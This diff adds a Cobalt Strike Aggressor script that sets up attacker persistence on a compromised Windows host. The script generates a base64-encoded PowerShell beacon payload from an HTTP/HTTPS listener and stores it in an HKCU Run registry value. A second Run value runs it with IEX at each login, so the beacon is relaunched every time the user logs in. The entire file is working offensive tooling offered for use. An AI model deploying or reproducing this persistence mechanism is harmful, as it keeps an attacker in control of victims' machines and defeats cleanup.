@@ -1,0 +1,53 @@
+#HKCU Run Key Registry PowerShell Persistence
+#Author: @r3dQu1nn
+#Generates a powershell Base64 Encoded payload as a HKCU Run Key Registry Entry for persistence on selected beacon based off a HTTP/HTTPS Listener
+
+sub payloadgenerate {
+	foreach $name (listeners()) {
+		$original_listener = $name;
+        $listener_name = lc($name);
+        if ($listener_name hasmatch "http" || $listener_name hasmatch "https") {
+        	$data = artifact($original_listener, "powershell");
+        	return base64_encode($data);
+		}
+	}
+}
+
+sub persistRegistryPowerShell {
+	$bid = $1;
+	$dialog = dialog("HKCU Run Key Registry PowerShell Persistence (User Level)", %(keyname => "Key Name for Payload..", keyname1 => "Key Name to execute Payload.."), lambda({
+		if ("$3['keyname']" ismatch 'Key Name for Payload..' || "$3['keyname1']" ismatch 'Key Name to execute Payload..') {
+			berror($bid, "\c4Please enter a valid Registry Key Names, Payload, and a valid Path location.");
+			break;
+		}
+		else {
+			$data = payloadgenerate($bid);
+			$powershellcmd = "Set-ItemProperty -Path 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname']."' -Type String -Value \"".$data."\"";
+			bpowershell!($bid, $powershellcmd);
+			blog($bid, "\cBSetting the first HKCU Run Key Value as '".$3['keyname']."'...");
+			$powershellcmd1 = "Set-ItemProperty -Path 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname1']."' -Value 'C:\\Windows\\SySWoW64\\WindowsPowerShell\\v1.0\\powershell.exe -NoExit -c (IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run ".$3['keyname'].").".$3['keyname']."))))'";
+			bpowershell!($bid, $powershellcmd1);
+			blog($bid, "\cBSetting the second HKCU Run Key Value as '".$3['keyname1']."'...");
+			blog($bid, "\cBDisplaying both Run Keys to Verify everything worked as intended...");
+			$powershellcmd2 = "Get-ItemProperty -Path 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname']."'";
+			bpowershell!($bid, $powershellcmd2);
+			$powershellcmd3 = "Get-ItemProperty -Path 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname1']."'";
+			bpowershell!($bid, $powershellcmd3);
+		}
+	}));
+
+	dialog_description($dialog, "HKCU Run Key Registry PowerShell Persistence - Generates a powershell Base64 Encoded payload as a HKCU Run Key Registry Entry for persistence on selected beacon.");
+	
+	drow_text($dialog, "keyname",  "Registry Key Name for Payload:");
+	drow_text($dialog, "keyname1", "Registry Key Name to execute Payload:");
+	
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+
+}
+
+popup beacon_bottom {
+	item "HKCU Run Key Registry PowerShell Persistence" {
+		persistRegistryPowerShell($1);
+	}
+}
